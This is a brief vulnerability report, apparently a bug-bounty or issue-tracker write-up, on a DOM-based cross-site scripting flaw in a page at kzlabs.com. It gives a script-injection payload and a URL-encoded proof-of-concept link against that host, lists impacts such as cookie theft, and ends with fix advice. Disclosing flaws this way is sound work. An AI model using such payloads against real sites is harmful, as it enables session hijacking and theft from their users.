# DOM-Based Cross-Site Scripting (XSS) via URL Parameter

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability exists in the application where user-controlled input from the URL is processed by client-side JavaScript and executed in the browser without proper sanitization.

The payload is executed directly in the DOM environment, resulting in arbitrary JavaScript execution.

---

## Vulnerable Endpoint

```text
http://kzlabs.com/65.php
```

---

## Payload Used

```html
'><Script>alert(1)</script>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/65.php?lever-xicorr%27%22%3E%3CScript%3Ealert(1)%3C/script%3E
   ```

2. Observe that the JavaScript payload executes in the browser.

3. Inspecting the page source shows the payload is handled client-side through DOM manipulation.

---

## Proof of Concept

```text
http://kzlabs.com/65.php?lever-xicorr%27%22%3E%3CScript%3Ealert(1)%3C/script%3E
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/2cae1da2-5b1a-47e0-9241-2772e58294bf" />

---

## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution
* DOM manipulation attacks

---

## Recommendations for Fix

* Avoid unsafe DOM sinks such as `innerHTML`, `document.write`, and `eval`
* Sanitize and validate user-controlled input
* Use secure DOM APIs like `textContent`
* Implement a strict Content Security Policy (CSP)
